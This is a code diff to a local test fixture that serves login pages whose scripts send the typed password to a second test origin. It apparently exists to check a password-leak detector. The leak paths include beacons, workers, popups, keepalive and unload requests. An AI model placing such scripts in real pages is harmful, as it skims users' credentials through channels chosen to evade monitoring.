@@ -2,9 +2,11 @@ import { createHash } from 'node:crypto';
 import { createServer, type IncomingMessage, type Server } from 'node:http';
 import type { Duplex } from 'node:stream';
 
+import { readBodyOrReject } from '../shared/loginFixture';
+
 type Origins = Readonly<{ primary: string; secondary: string }>;
 type Route = (origins: Origins) => string;
-type LabRequest = Readonly<{ method: string; path: string }>;
+export type LabRequest = Readonly<{ method: string; path: string; body?: string }>;
 
 export const CONTROL_LAB_ROUTES = Object.freeze({
   '/password-basic': () => loginForm(),
@@ -135,6 +137,124 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
       navigator.sendBeacon('${secondary}/blob-beacon', new Blob([this.value]));
     });
   </script>`,
+  '/empty-beacon': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      navigator.sendBeacon('${secondary}/empty-beacon-receive');
+    });
+  </script>`,
+  '/bodyless-methods': ({ primary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      fetch('${primary}/bodyless-post', { method: 'POST' }).catch(function(){});
+      fetch('${primary}/bodyless-delete', { method: 'DELETE' }).catch(function(){});
+    });
+  </script>`,
+  '/worker-blob': ({ secondary }) => workerLeakPage(`${secondary}/worker-blob-receive`, 150),
+  '/worker-beacon': ({ secondary }) => workerLeakPage(`${secondary}/worker-beacon-receive`),
+  '/nested-worker-blob': ({ secondary }) => nestedWorkerLeakPage(`${secondary}/nested-worker-blob-receive`, 150),
+  '/workers-200': ({ secondary }) => manyWorkersPage(`${secondary}/workers-200-receive`, 200),
+  '/terminate-workers-20': ({ secondary }) => terminateDuringAttachPage(
+    `${secondary}/terminate-workers-live-receive`,
+  ),
+  '/navigate-workers-20': ({ secondary }) => navigateDuringWorkersPage(
+    `${secondary}/navigate-workers-receive`,
+  ),
+  '/terminate-worker-slow': ({ secondary }) => terminatingWorkerPage(
+    `${secondary}/terminate-worker-slow-receive`, false,
+  ),
+  '/terminate-worker-fast': ({ secondary }) => terminatingWorkerPage(
+    `${secondary}/terminate-worker-fast-receive`, true,
+  ),
+  '/page-close-worker': ({ secondary }) => workerLeakPage(`${secondary}/page-close-worker-receive`, 150),
+  '/page-close-worker-race': ({ secondary }) => workerLeakPage(`${secondary}/page-close-worker-race-receive`),
+  '/query-workers-200': ({ secondary }) => manyWorkersPage(
+    `${secondary}/query-workers-200-receive`, 200, 'QUERY',
+  ),
+  '/popup-worker': () => `${loginForm()}<button id="popup" type="button">Popup</button><script>
+    document.querySelector('#popup').addEventListener('click', function () {
+      var value = document.querySelector('#password').value;
+      window.open('/popup-worker-child', value);
+    });
+  </script>`,
+  '/popup-worker-child': ({ secondary }) => `<script>
+    var value = window.name;
+    var source = ${JSON.stringify(workerSource(`${secondary}/popup-worker-receive`))};
+    var worker = new Worker(URL.createObjectURL(new Blob([source])));
+    worker.postMessage(value);
+  </script>`,
+  '/popup-blob': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      window.open('/popup-blob-child', this.value);
+    });
+  </script>`,
+  '/popup-blob-child': ({ secondary }) => `<script>
+    fetch(${JSON.stringify(`${secondary}/popup-blob-receive`)}, {
+      method: 'POST', body: new Blob([window.name])
+    }).catch(function(){});
+  </script>`,
+  '/popup-blob-close': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      window.open('/popup-blob-close-child', this.value);
+    });
+  </script>`,
+  // The popup closes itself in the same task as its keepalive POST: no child session sees the request and the
+  // resolved headers never arrive (register C-B2f2: counted as unobserved through the provisional-header path).
+  '/popup-blob-close-child': ({ secondary }) => `<script>
+    fetch(${JSON.stringify(`${secondary}/popup-blob-close-receive`)}, {
+      method: 'POST', body: new Blob([window.name]), keepalive: true
+    }).catch(function(){});
+    window.close();
+  </script>`,
+  // Main-thread keepalive Blob POST then an immediate navigation: the page session's deferred body fetch fails
+  // (register C-B2f2: a target-detached marker, never a capture failure).
+  '/keepalive-navigate': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      fetch(${JSON.stringify(`${secondary}/keepalive-navigate-receive`)}, {
+        method: 'POST', body: new Blob([this.value]), keepalive: true
+      }).catch(function(){});
+      location.href = '/nowhere';
+    });
+  </script>`,
+  // Unload-time beacon: sent from pagehide while the page navigates; raises no request event anywhere
+  // (declared M5-C7, register C-B2f2 — the test documents the miss and flips red when it is captured).
+  '/unload-beacon': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var value = this.value;
+      addEventListener('pagehide', function () {
+        navigator.sendBeacon(${JSON.stringify(`${secondary}/unload-beacon-receive`)}, new Blob([value]));
+      });
+      location.href = '/nowhere';
+    });
+  </script>`,
+  '/close-about-blank': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var popup = window.open('about:blank');
+      if (popup) popup.close();
+    });
+  </script>`,
+  '/self-closing-popup': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      window.open('/self-closing-popup-child');
+    });
+  </script>`,
+  '/self-closing-popup-child': () => '<script>window.close()</script>',
+  '/busy-popup': () => `${loginForm()}<button id="popup" type="button">Popup</button><script>
+    document.querySelector('#popup').addEventListener('click', function () {
+      window.open('/busy-popup-child');
+    });
+  </script>`,
+  '/busy-popup-child': () => '<script>var until=Date.now()+4000;while(Date.now()<until){};</script>',
+  '/decoy-control': () => `${loginForm()}<form method="post" action="/verify">
+    <input id="decoy" type="password"><button id="verify" type="submit">Verify</button></form>`,
+  '/reflect-redirect': () => loginForm('name="password"', 'action="/reflect"'),
+  '/console-leak': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var shape = new URL(location.href).searchParams.get('shape');
+      if (shape === 'object') console.log({ password: this.value });
+      else if (shape === 'array') console.log([this.value]);
+      else if (shape === 'format') console.log('%s', this.value);
+      else console.log(this.value);
+    });
+  </script>`,
   '/header-leak': ({ secondary }) => `${loginForm()}<script>
     document.querySelector('#password').addEventListener('input', function () {
       fetch('${secondary}/header-receive', { headers: { 'x-tv-leak': this.value } }).catch(() => {});
@@ -157,8 +277,9 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
       fetch('/cookie-receive').catch(() => {});
     });
   </script>`,
-  '/ws-leak': ({ secondary }) => `${loginForm()}<script>
+  '/ws-leak': ({ secondary }) => `${loginForm()}<button id="ws-ready" type="button" disabled>Ready</button><script>
     var socket = new WebSocket('${secondary.replace('http:', 'ws:')}/ws-receive');
+    socket.addEventListener('open', () => { document.querySelector('#ws-ready').disabled = false });
     document.querySelector('#password').addEventListener('input', function () {
       var value = this.value;
       if (socket.readyState === WebSocket.OPEN) socket.send(value);
@@ -201,15 +322,14 @@ export async function startControlsLab(): Promise<ControlsLab> {
   let origins: Origins = { primary: '', secondary: '' };
   const secondaryRequests: LabRequest[] = [];
   const secondary = createServer((request, response) => {
-    secondaryRequests.push(Object.freeze({
-      method: request.method ?? '',
-      path: new URL(request.url ?? '/', 'http://fixture.invalid').pathname,
-    }));
-    serve(request.url, response, () => origins);
+    void serveAndCapture(request, response, () => origins, secondaryRequests)
+      .catch(() => response.destroy());
   });
   attachWebSocketServer(secondary, secondaryRequests);
   const secondaryOrigin = await listen(secondary);
-  const primary = createServer((request, response) => serve(request.url, response, () => origins));
+  const primary = createServer((request, response) => {
+    void serveAndCapture(request, response, () => origins).catch(() => response.destroy());
+  });
   attachWebSocketServer(primary, []);
   let primaryOrigin: string;
   try {
@@ -227,14 +347,25 @@ export async function startControlsLab(): Promise<ControlsLab> {
   });
 }
 
-function serve(
-  rawUrl: string | undefined,
+async function serveAndCapture(
+  request: IncomingMessage,
   response: import('node:http').ServerResponse,
   getOrigins: () => Origins,
-): void {
-  const path = new URL(rawUrl ?? '/', 'http://fixture.invalid').pathname;
+  requests?: LabRequest[],
+): Promise<void> {
+  const url = new URL(request.url ?? '/', 'http://fixture.invalid');
+  const path = url.pathname;
+  const body = await readBodyOrReject(request, response, 500);
+  if (body === undefined) return;
+  requests?.push(Object.freeze({
+    method: request.method ?? '', path, ...(body === '' ? {} : { body }),
+  }));
   if (path === '/redirect-start') return redirect(response, '/redirect-middle');
   if (path === '/redirect-middle') return redirect(response, '/redirect-final');
+  if (path === '/reflect' && request.method === 'POST') {
+    const value = new URLSearchParams(body).get('password') ?? body;
+    return redirect(response, `${getOrigins().secondary}/landed?p=${encodeURIComponent(value)}`);
+  }
   if (path === '/submit' || path === '/login') {
     response.statusCode = 200;
     response.end('ok');
@@ -244,7 +375,7 @@ function serve(
   response.setHeader('content-type', 'text/html; charset=utf-8');
   response.setHeader('access-control-allow-origin', '*');
   response.setHeader('access-control-allow-headers', 'x-tv-leak');
-  response.setHeader('access-control-allow-methods', 'GET, POST, OPTIONS');
+  response.setHeader('access-control-allow-methods', 'GET, POST, OPTIONS, QUERY');
   if (response.req.method === 'OPTIONS') {
     response.statusCode = 204;
     response.end();
@@ -318,6 +449,95 @@ function formWithField(field: string): string {
 function mutationPage(statement: string, extra = ''): string {
   return `${loginForm()}<button id="mutate" type="button">Mutate</button>${extra}
     <script>document.querySelector('#mutate').addEventListener('click',()=>{${statement}})</script>`;
+}
+
+function workerSource(endpoint: string, delayMs = 0, method = 'POST'): string {
+  const send = `fetch(${JSON.stringify(endpoint)},`
+    + `{method:${JSON.stringify(method)},body:new Blob([event.data])}).catch(function(){})`;
+  return `self.onmessage=function(event){${delayMs > 0
+    ? `setTimeout(function(){${send}},${delayMs})`
+    : send}}`;
+}
+
+function workerLeakPage(endpoint: string, delayMs = 0): string {
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(workerSource(endpoint, delayMs))}])));
+      worker.postMessage(this.value);
+    });
+  </script>`;
+}
+
+function nestedWorkerLeakPage(endpoint: string, delayMs = 0): string {
+  const inner = workerSource(endpoint, delayMs);
+  const outer = `self.onmessage=function(event){var source=${JSON.stringify(inner)};`
+    + `var worker=new Worker(URL.createObjectURL(new Blob([source])));worker.postMessage(event.data)}`;
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(outer)}])));
+      worker.postMessage(this.value);
+    });
+  </script>`;
+}
+
+function manyWorkersPage(endpoint: string, count: number, method = 'POST'): string {
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      window.__workers = [];
+      for (var index = 0; index < ${count}; index += 1) {
+        var source = ${JSON.stringify(workerSource(`${endpoint}?index=`, 0, method))}
+          .replace(${JSON.stringify(`${endpoint}?index=`)}, ${JSON.stringify(`${endpoint}?index=`)} + index);
+        var worker = new Worker(URL.createObjectURL(new Blob([source])));
+        window.__workers.push(worker);
+        worker.postMessage(this.value);
+      }
+    });
+  </script>`;
+}
+
+function terminateDuringAttachPage(liveEndpoint: string): string {
+  const idle = 'self.onmessage=function(){}';
+  const live = `self.onmessage=function(event){setTimeout(function(){fetch(${JSON.stringify(liveEndpoint)},`
+    + `{method:'POST',body:new Blob([event.data])}).catch(function(){})},300)}`;
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      for (let delay = 0; delay < 20; delay += 1) {
+        const worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(idle)}])));
+        setTimeout(() => worker.terminate(), delay);
+      }
+      const liveWorker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(live)}])));
+      liveWorker.postMessage(this.value);
+    });
+  </script>`;
+}
+
+function navigateDuringWorkersPage(endpoint: string): string {
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      for (let index = 0; index < 20; index += 1) {
+        const worker = new Worker(URL.createObjectURL(new Blob([
+          ${JSON.stringify(workerSource(endpoint))}
+        ])));
+        worker.postMessage(this.value);
+      }
+      location.href = '/nowhere';
+    });
+  </script>`;
+}
+
+function terminatingWorkerPage(endpoint: string, afterDelivery: boolean): string {
+  const source = `self.onmessage=async function(event){self.postMessage('sending');`
+    + `await fetch(${JSON.stringify(endpoint)},{method:'POST',body:new Blob([event.data])});`
+    + `self.postMessage('delivered')}`;
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(source)}])));
+      worker.onmessage = function (event) {
+        if (event.data === ${JSON.stringify(afterDelivery ? 'delivered' : 'sending')}) worker.terminate();
+      };
+      worker.postMessage(this.value);
+    });
+  </script>`;
 }
 
 function overlayStyle(): string {
